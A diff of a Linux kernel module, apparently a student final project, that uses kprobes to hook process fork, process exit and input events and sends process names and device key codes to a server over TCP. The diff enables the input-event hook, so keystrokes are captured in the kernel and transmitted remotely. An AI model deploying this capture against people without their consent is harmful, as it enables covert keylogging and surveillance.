@@ -11,32 +11,30 @@
 #include "protocol.h"
 #include "workqueue.h"
 #include "tcp_socket.h"
-
-#define HOOK_INPUT_EVENT "input_event"
-#define HOOK_PROCESS_EXIT "do_exit"
-#define HOOK_PROCESS_FORK "kernel_clone" // Originally named 'do_fork'
-					 // Linux newer versions use 'kernel clone'
-/* #define HOOK_FILE_OPEN "do_sys_openat", "__sys_sendmsg" - Not used, OS frequently uses this functions
- * 				 	    		     Hooking such function will crash the computer
- */
-
+#include "kClientHook.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Omer Kfir");
 MODULE_DESCRIPTION("Final project");
 
-static void transmit_data(struct work_struct *work);
-static int handler_pre_do_fork(struct kprobe*, struct pt_regs*);
-static int handler_pre_do_exit(struct kprobe*, struct pt_regs*);
-//static int handler_pre_input_event(struct kprobe*, struct pt_regs*);
-static int register_probes(void);
-static void unregister_probes(int);
-
-/* Enum of all kprobes, each kprobe value is the index inside the array */
-typedef enum {kp_do_fork, kp_do_exit, kp_input_event, PROBES_SIZE} kernel_probes;
-
 /* Kprobes structures */
-static struct kprobe kps[PROBES_SIZE] = {0};
+static struct kprobe kps[PROBES_SIZE] = {
+    [kp_do_fork] = 
+    {
+        .pre_handler = handler_pre_do_fork,
+        .symbol_name = HOOK_PROCESS_FORK
+    },
+    [kp_do_exit] = 
+    {
+        .pre_handler = handler_pre_do_exit,
+        .symbol_name = HOOK_PROCESS_EXIT
+    },
+    [kp_input_event] = 
+    {
+    	.pre_handler = handler_pre_input_event,
+	.symbol_name = HOOK_INPUT_EVENT
+    }
+};
 
 /* Global socket variables */
 static struct socket *sock; // Socket struct
@@ -47,7 +45,7 @@ static struct workqueue_struct *tcp_sock_wq; // Workqueue for sending tcp socket
 /* Attemps to send data to server side */
 static void transmit_data(struct work_struct *work)
 {
-	struct wq_msg *curr_msg = container_of(work, wq_msg, work);
+	wq_msg *curr_msg = container_of(work, wq_msg, work);
 	int ret;
 
     	mutex_lock(&sock_mutex);
@@ -95,7 +93,7 @@ static int handler_pre_do_fork(struct kprobe *kp, struct pt_regs *regs)
 	if ( !current )
 		return 0;
 	
-	msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPERSTOR "%s", MSG_PROCESS_OPEN, current->comm);
+	msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPARATOR "%s", MSG_PROCESS_OPEN, current->comm);
 	if ( msg_length > 0)
 		workqueue_message(tcp_sock_wq, transmit_data, msg_buf, msg_length);
 
@@ -111,7 +109,7 @@ static int handler_pre_do_exit(struct kprobe *kp, struct pt_regs *regs)
 	if ( !current )
 		return 0;
 	
-	msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPERSTOR "%s", MSG_PROCESS_OPEN, current->comm);
+	msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPARATOR "%s", MSG_PROCESS_CLOSE, current->comm);
         if ( msg_length > 0)
                 workqueue_message(tcp_sock_wq, transmit_data, msg_buf, msg_length);
 
@@ -120,66 +118,54 @@ static int handler_pre_do_exit(struct kprobe *kp, struct pt_regs *regs)
 }
 
 /* Device input events */
-/*
 static int handler_pre_input_event(struct kprobe *kp, struct pt_regs *regs)
 {
+        char msg_buf[BUFFER_SIZE];
+        size_t msg_length;
+
+	struct input_dev *dev;
+	unsigned int code;
+
 	if ( !regs ) // Checking current is irrelevant due to interrupts
 		return 0;
 
-	struct input_dev *dev = (struct input_dev *)regs->di; // First parameter
-	unsigned int code = (unsigned int)regs->dx; 	      // Third paramater
+	dev = (struct input_dev *)regs->di; // First parameter
+	code = (unsigned int)regs->dx; 	    // Third paramater
 	
-	printk(KERN_INFO "Device Named: %s | Device code: %d\n", dev->name, code);
+	msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPARATOR "%s" PROTOCOL_SEPARATOR "%d", MSG_INPUT_EVENT, dev->name, code);
+
+	if ( msg_length > 0 )
+		workqueue_message(tcp_sock_wq, transmit_data, msg_buf, msg_length);
+
 	return 0;
 }
-*/
+
+
 /* Register all hooks */
 static int register_probes(void)
 {
-	/* ret variable for returning value of init function */
-        int ret;
+       int ret = 0, i;
 
-        /* Set up creation of new processes function */
-        kps[kp_do_fork].pre_handler = handler_pre_do_fork;
-        kps[kp_do_fork].symbol_name = HOOK_PROCESS_FORK;
-
-        /* Registering kprobe, which sets up an interrupt before calling function */
-        ret = register_kprobe(&kps[kp_do_fork]);
-        if (ret < 0) // Error
-        {
-                printk(KERN_INFO "Failed to register %s,goodbye\n", kps[kp_do_fork].symbol_name);
-                goto end;
-        }
-
-        /* Set up termination of process function */
-        kps[kp_do_exit].pre_handler = handler_pre_do_exit;
-        kps[kp_do_exit].symbol_name = HOOK_PROCESS_EXIT;
-
-        ret = register_kprobe(&kps[kp_do_exit]);
-        if (ret < 0)
-        {
-                unregister_probes(kp_do_exit);
-                printk(KERN_INFO "Failed to register %s, bye bye\n", kps[kp_do_exit].symbol_name);
-                goto end;
-        }
-
-	/* Set up sending message using socket */
-	/*
-	kps[kp_input_event].pre_handler = handler_pre_input_event;
-	kps[kp_input_event].symbol_name = HOOK_INPUT_EVENT;
-
-	ret = register_kprobe(&kps[kp_input_event]);
-	if (ret < 0)
+       	/* Iterate through kps array of structs */
+	for(i=0;i<PROBES_SIZE;i++)
 	{
-		unregister_probes(kp_input_event);
-		printk(KERN_INFO "Failed to register %s, banana\n", kps[kp_input_event].symbol_name);
-		goto end;
-	}
-	*/
-        printk(KERN_INFO "Finished hooking succusfully\n");
-end:
-        return ret;
+		ret = register_kprobe(&kps[i]);
 
+		/* 
+		 * In case register fails unregister all
+		 * Probes that had been done before it
+		 * To ensure all probes are cleared
+		 */
+		if ( ret < 0 )
+		{
+			unregister_probes(i);
+			printk(KERN_ERR "Failed to register: %s\n", kps[i].symbol_name);
+			return ret;
+		}
+	}       
+	
+	printk(KERN_INFO "Finished hooking succusfully\n");
+        return ret;
 }
 
 /* Unregister all kprobes */
